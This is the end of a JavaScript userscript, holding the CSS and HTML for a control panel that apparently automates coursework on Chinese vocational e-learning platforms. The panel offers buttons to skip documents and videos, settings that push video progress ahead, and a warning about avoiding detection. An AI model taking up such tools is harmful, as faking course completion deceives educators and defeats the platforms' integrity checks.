            #hcq-content-left {left: -180px}
            #hcq-content-left {position: absolute}
            #hcq-content-left.open {left: 0}
            #hcq-content-left+.left-btn>span {transform: rotate(0)}
            #hcq-content-left.open+.left-btn>span {transform: rotate(180deg)}
            .coures-menu>.menu-box {width: 25%}}
        @media all and (max-width:648px) {
            .coures-menu>.menu-box {width: 33.33%}}
        @media all and (max-width:480px) {
            #console-info {width: 100%;height: 90%;left: 0}
            .coures-menu>.menu-box {width: 50%}}`}function getHtml(){return`
        <div id="hcq-content">
        <div id="hcq-content-left">
            <img src="http://q1.qlogo.cn/g?b=qq&nk=2533094475&s=640" alt="用户头像">
            <div class="left-item">
                <span>用户名</span>
                <span class="user-name text-ellipsis">有问题联系邮箱</span>
            </div>
            <div class="left-item">
                <span>学号</span>
                <span class="stuNum text-ellipsis">不要加QQ会打扰到作者</span>
            </div>
            <div class="left-item">
                <div class="switch-platform btn">
                    <span>切换平台</span>
                </div>
            </div>
            <div class="left-item">
                <div class="mian-run btn">
                    <span></span>
                </div>
            </div>
        </div>
        <div class="left-btn">
            <span>></span>
        </div>
        <div class="switch-box">
            <ul>
                <li data-type="0">职教云</li>
                <li data-type="1">智慧职教</li>
                <li data-type="2">职教云资源库</li>
            </ul>
        </div>
        <div id="hcq-main">
            <div id="console-info" class="show">
                <div class="info-box"></div>
            </div>
            <div class="coures-item coures-menu">
                <span style="display: block;width: 100%;text-align: center;">请在<time>15</time>秒内选择课程，过时自动选择</span>
            </div>
            <div class="coures-item" style="background-color: #666;color: #fff;overflow-y: auto;" id="supportBox">
                <br> <br>
                <center>脚本制作不易,如果该脚本对你有帮助的话，希望客官能为该项目点一个免费的<a href="https://github.com/hsjzhcq/hcqHome">start</a>,作者在此感激不尽😘</center>
                <br> <br>
                <center>如果能请作者喝瓶饮料的话，那就更开心了😁</center>
                <br>
                <center>
                    <img src="https://cdn.jsdelivr.net/gh/hsjzhcq/hcqHome@main/img/wx.png" width=240 alt="微信" title="微信收款码">
                    <img src="https://cdn.jsdelivr.net/gh/hsjzhcq/hcqHome@main/img/zfb.png" width=240 alt="支付宝" title="支付宝收款码">
                </center>
            </div>
            <div class="coures-item flex" id="changeBg">
                <b>可选择图片在线链接或者本地文件(最大2M)</b>
                <div class="form-group">
                    <label>URL: <input type="text">
                    <button>确定</button>
                </label>
                </div>
                <div class="form-group">
                    <label class="file-btn">
                        选择文件
                    <input type="file" accept="image/*">
                </label>
                </div>
            </div>
            <div class="coures-item coures-view"></div>
        </div>
        <div id="hcq-content-right">
            <div class="right-btn">
                <span>&#60</span>
            </div>
            <div class="menu-item">
                <span>请求发送速度</span>
                <div>
                    [<input type="text" placeholder="1-4" data-default="3" id="ajax-set" value="3">秒修改一次]
                </div>
            </div>
            <div class="menu-item">
                <span>文档修改速度</span>
                <div>
                    [<input type="text" placeholder="1-4" data-default="2" id="dom-set" value="2">秒修改一次]
                </div>
            </div>
            <div class="menu-item">
                <span>视频修改速度</span>
                <div>
                    [<input type="text" placeholder="8-15" data-default="10" id="video-set" value="10">秒修改一次]
                </div>
            </div>
            <div class="menu-item">
                <span>视频修改时间</span>
                <div>
                    [视频当前进度+<input type="text" id="video-time-set" data-default="15" placeholder="12-22" value="15">秒]
                </div>
            </div>
            <div class="menu-item">
                <span style="color:red;">修改速度过快可能导致被检测而异常</span>
                <span style="color:red;">已限定修改范围，请酌情修改</span>
            </div>
            <div class="menu-item">
                <span id="clear-info" style="cursor: pointer">点我清除页面信息</span>
            </div>
            <div class="menu-item flex" id="menubar">
                <div class="loader" data-type="change">更换课程</div>
                <div class="loader" data-type="jump-dom">跳过文档</div>
                <div class="loader" data-type="jump-video">跳过视频</div>
                <div class="loader" data-type="jump-this">跳过本节</div>
                <div class="loader" data-type="view">打开视图</div>
                <div data-type="feedback">
                    <a target="_blank" href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=2533094475@qq.com">反馈意见</a>
                </div>
                <div data-type="support">支持作者</div>
                <div data-type="changeBg">更换背景</div>
                <div data-type="clearCache">清除缓存</div>
            </div>
        </div>
    </div>`}})();
